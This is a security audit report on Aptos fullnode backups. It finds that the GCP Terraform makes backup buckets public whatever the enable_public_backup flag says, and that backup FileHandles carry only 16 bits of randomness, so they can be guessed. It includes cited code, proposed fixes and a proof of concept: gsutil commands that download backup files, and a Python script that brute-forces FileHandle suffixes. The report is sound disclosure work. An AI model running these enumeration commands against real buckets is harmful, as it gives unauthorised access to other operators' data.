# Audit Report

## Title
GCP Backup Storage Unconditionally Public Despite enable_public_backup Flag + Enumerable FileHandles Enable Unauthorized Backup Access

## Summary
The GCP Terraform configuration for fullnode backups unconditionally grants public read access to all backup data, ignoring the `enable_public_backup` variable that defaults to `false`. Combined with FileHandles stored as plain strings in JSON manifests and predictable naming patterns, attackers can enumerate and access backup data without authentication, violating operator privacy expectations and enabling cross-organization data access in shared bucket scenarios.

## Finding Description

The vulnerability consists of three interconnected issues:

**1. GCP Terraform Misconfiguration - Unconditional Public Access**

The GCP backup configuration always grants public access to the backup bucket, regardless of the `enable_public_backup` variable setting: [1](#0-0) 

Unlike the AWS implementation which conditionally creates public access based on the variable: [2](#0-1) 

The `enable_public_backup` variable exists in both configurations with a default value of `false`: [3](#0-2) 

**2. FileHandles Stored as Plain Strings**

FileHandles are type aliases for `String` with no cryptographic protection or access validation: [4](#0-3) 

These FileHandles are serialized directly into JSON manifests: [5](#0-4) [6](#0-5) 

**3. Predictable FileHandle Generation with Low Entropy**

FileHandles follow predictable patterns with only 16 bits of randomness: [7](#0-6) 

For GCP storage, FileHandles are simply constructed as `$BACKUP_HANDLE/$FILE_NAME`: [8](#0-7) 

**4. No Application-Level Access Control**

The `open_for_read` function performs no validation of whether the caller is authorized to access a given FileHandle: [9](#0-8) 

**Attack Path:**

1. Attacker lists metadata files (publicly accessible on GCP): `gsutil ls gs://$BUCKET/$SUB_DIR/metadata/`
2. Downloads metadata files containing manifest FileHandles: [10](#0-9) 

3. Parses JSON to extract manifest FileHandles
4. Downloads manifest files containing chunk FileHandles
5. Enumerates and downloads all backup chunks
6. Or brute-forces FileHandles using known epoch/version numbers and 65,536 possible suffixes

## Impact Explanation

This vulnerability rates as **Medium severity** for the following reasons:

**Privacy Violation**: Operators deploying with `enable_public_backup=false` (the default) reasonably expect their backups to be private. The GCP terraform configuration violates this expectation, exposing operational metadata including:
- Backup timing and frequency patterns
- Infrastructure topology (bucket names, organizational structure)
- Node identity and backup coverage
- Version and epoch progression rates

**Cross-Organization Access**: In shared bucket deployments (even with different `SUB_DIR` values), one organization's compromised credentials can access another organization's backups, as there is no application-level validation of FileHandle ownership.

**Information Disclosure**: While blockchain state is public, operational privacy matters for:
- Private/permissioned Aptos deployments (if any exist)
- Competitive intelligence (node operators, backup strategies)
- Infrastructure reconnaissance for targeted attacks

This aligns with the Aptos bug bounty **Medium severity** category for "state inconsistencies requiring intervention" and information exposure beyond intended scope.

## Likelihood Explanation

**Very High Likelihood** for GCP deployments:

1. **Misconfiguration is always active**: Every GCP fullnode deployment using the provided terraform has public backups regardless of settings
2. **Trivial to exploit**: Requires only `gsutil ls` and `gsutil cp` commands
3. **No authentication required**: Anyone on the internet can access GCP backup buckets
4. **Metadata provides roadmap**: Metadata files enumerate all available backups and their FileHandles

**Medium Likelihood** for shared bucket scenarios:

1. **Configuration dependent**: Only affects deployments sharing buckets across trust boundaries
2. **Cloud IAM limitations**: Most cloud IAM systems grant bucket-level access, not path-level

## Recommendation

**Fix 1: Add Conditional Public Access to GCP Terraform**

Modify `terraform/fullnode/gcp/backup.tf` to conditionally create the public IAM member:

```terraform
resource "google_storage_bucket_iam_member" "public" {
  count  = var.enable_public_backup ? 1 : 0
  bucket = google_storage_bucket.backup.name
  role   = "roles/storage.objectViewer"
  member = "allUsers"
}
```

**Fix 2: Add Application-Level Access Control**

Implement FileHandle ownership validation in the backup storage layer. Add a signature or HMAC to FileHandles that proves the caller is authorized:

```rust
pub struct AuthenticatedFileHandle {
    path: String,
    owner_id: String,
    signature: Vec<u8>,
}
```

**Fix 3: Increase Random Entropy**

Use cryptographically random suffixes with higher entropy (e.g., 128-bit UUID):

```rust
use uuid::Uuid;

async fn create_backup_with_random_suffix(&self, name: &str) -> Result<BackupHandle> {
    let suffix = Uuid::new_v4();
    self.create_backup(&format!("{}.{}", name, suffix).try_into()?).await
}
```

**Fix 4: Document Deployment Security**

Add clear warnings in deployment documentation about:
- GCP backups are currently always public
- Shared buckets should use separate GCP projects for isolation
- The `enable_public_backup` variable only works for AWS

## Proof of Concept

**Step 1: Verify GCP Public Access (No Authentication Required)**

```bash
# List all metadata files in a GCP fullnode backup bucket
# Replace BUCKET and SUB_DIR with any known GCP backup location
gsutil ls gs://aptos-testnet-backup-abc123/e1/metadata/

# Download a metadata file
gsutil cp gs://aptos-testnet-backup-abc123/e1/metadata/state_snapshot_ver_1000.meta ./

# Parse JSON to extract manifest FileHandle
cat state_snapshot_ver_1000.meta | jq -r '.manifest'
# Output: "state_epoch_1_ver_1000.a3f2/state.manifest"

# Download the manifest
gsutil cp gs://aptos-testnet-backup-abc123/e1/state_epoch_1_ver_1000.a3f2/state.manifest ./

# Parse manifest to extract chunk FileHandles
cat state.manifest | jq -r '.chunks[].blobs'
# Output: "state_epoch_1_ver_1000.a3f2/0-.chunk"

# Download backup chunks
gsutil cp gs://aptos-testnet-backup-abc123/e1/state_epoch_1_ver_1000.a3f2/0-.chunk ./
```

**Step 2: Enumerate FileHandles via Brute Force**

```python
#!/usr/bin/env python3
# Brute force FileHandles using known epoch/version and low entropy suffix

import subprocess
import sys

BUCKET = "aptos-testnet-backup-abc123"
SUB_DIR = "e1"
EPOCH = 5
VERSION = 12345

for suffix in range(0x0000, 0x10000):
    backup_name = f"state_epoch_{EPOCH}_ver_{VERSION}.{suffix:04x}"
    file_handle = f"{backup_name}/state.manifest"
    gs_path = f"gs://{BUCKET}/{SUB_DIR}/{file_handle}"
    
    # Try to access the file
    result = subprocess.run(
        ["gsutil", "ls", gs_path],
        capture_output=True,
        text=True
    )
    
    if result.returncode == 0:
        print(f"[+] Found valid backup: {backup_name}")
        # Download and parse manifest for chunk FileHandles
        subprocess.run(["gsutil", "cp", gs_path, f"./manifest_{suffix:04x}.json"])
```

## Notes

While Aptos blockchain state is inherently public, this vulnerability violates the principle of least privilege and operator privacy expectations. The GCP terraform misconfiguration is a clear bug that causes `enable_public_backup=false` to be silently ignored, leading to unintended public exposure. Combined with enumerable FileHandles and lack of application-level access control, this creates a data privacy issue warranting Medium severity classification.

### Citations

**File:** terraform/fullnode/gcp/backup.tf (L27-32)
```terraform
# backup public access
resource "google_storage_bucket_iam_member" "public" {
  bucket = google_storage_bucket.backup.name
  role   = "roles/storage.objectViewer"
  member = "allUsers"
}
```

**File:** terraform/fullnode/aws/backup.tf (L17-21)
```terraform
resource "aws_s3_bucket_acl" "public-backup" {
  count  = var.enable_public_backup ? 1 : 0
  bucket = aws_s3_bucket.backup.id
  acl    = "public-read"
}
```

**File:** terraform/fullnode/gcp/variables.tf (L306-310)
```terraform
variable "enable_public_backup" {
  description = "Provide data backups to the public"
  type        = bool
  default     = false
}
```

**File:** storage/backup/backup-cli/src/storage/mod.rs (L36-41)
```rust
/// URI pointing to a file in a backup storage, like "s3:///bucket/path/file".
/// These are created by the storage when `create_for_write()`, stored in manifests by the backup
/// controller, and passed back to the storage when `open_for_read()` by the restore controller
/// to retrieve a file referred to in the manifest.
pub type FileHandle = String;
pub type FileHandleRef = str;
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/manifest.rs (L9-27)
```rust
/// A chunk of a state snapshot manifest, representing accounts in the key range
/// [`first_key`, `last_key`] (right side inclusive).
#[derive(Deserialize, Serialize)]
pub struct StateSnapshotChunk {
    /// index of the first account in this chunk over all accounts.
    pub first_idx: usize,
    /// index of the last account in this chunk over all accounts.
    pub last_idx: usize,
    /// key of the first account in this chunk.
    pub first_key: HashValue,
    /// key of the last account in this chunk.
    pub last_key: HashValue,
    /// Repeated `len(record) + record` where `record` is BCS serialized tuple
    /// `(key, state_value)`
    pub blobs: FileHandle,
    /// BCS serialized `SparseMerkleRangeProof` that proves this chunk adds up to the root hash
    /// indicated in the backup (`StateSnapshotBackup::root_hash`).
    pub proof: FileHandle,
}
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/backup.rs (L465-480)
```rust
        let manifest = StateSnapshotBackup {
            epoch: self.epoch,
            version: self.version(),
            root_hash: txn_info.transaction_info().ensure_state_checkpoint_hash()?,
            chunks,
            proof: proof_handle,
        };

        let (manifest_handle, mut manifest_file) = self
            .storage
            .create_for_write(backup_handle, Self::manifest_name())
            .await?;
        manifest_file
            .write_all(&serde_json::to_vec(&manifest)?)
            .await?;
        manifest_file.shutdown().await?;
```

**File:** storage/backup/backup-cli/src/utils/storage_ext.rs (L39-42)
```rust
    async fn create_backup_with_random_suffix(&self, name: &str) -> Result<BackupHandle> {
        self.create_backup(&format!("{}.{:04x}", name, random::<u16>()).try_into()?)
            .await
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/gcp.sample.yaml (L10-18)
```yaml
  create_for_write: |
    # file handle is the file name under the folder with the name of the backup handle
    FILE_HANDLE="$BACKUP_HANDLE/$FILE_NAME"
    # output file handle to stdout
    echo "$FILE_HANDLE"
    # close stdout
    exec 1>&-
    # route stdin to file handle
    gzip -c | gsutil -q cp - "gs://$BUCKET/$SUB_DIR/$FILE_HANDLE" > /dev/null
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/mod.rs (L114-124)
```rust
    async fn open_for_read(
        &self,
        file_handle: &FileHandleRef,
    ) -> Result<Box<dyn AsyncRead + Send + Unpin>> {
        let child = self
            .cmd(&self.config.commands.open_for_read, vec![
                EnvVar::file_handle(file_handle.to_string()),
            ])
            .spawn()?;
        Ok(Box::new(child.into_data_source()))
    }
```

**File:** storage/backup/backup-cli/src/metadata/mod.rs (L175-189)
```rust
#[derive(Clone, Debug, Deserialize, Serialize, Eq, PartialEq, Ord, PartialOrd)]
pub struct EpochEndingBackupMeta {
    pub first_epoch: u64,
    pub last_epoch: u64,
    pub first_version: Version,
    pub last_version: Version,
    pub manifest: FileHandle,
}

#[derive(Clone, Debug, Deserialize, Serialize, Eq, PartialEq, Ord, PartialOrd)]
pub struct StateSnapshotBackupMeta {
    pub epoch: u64,
    pub version: Version,
    pub manifest: FileHandle,
}
```
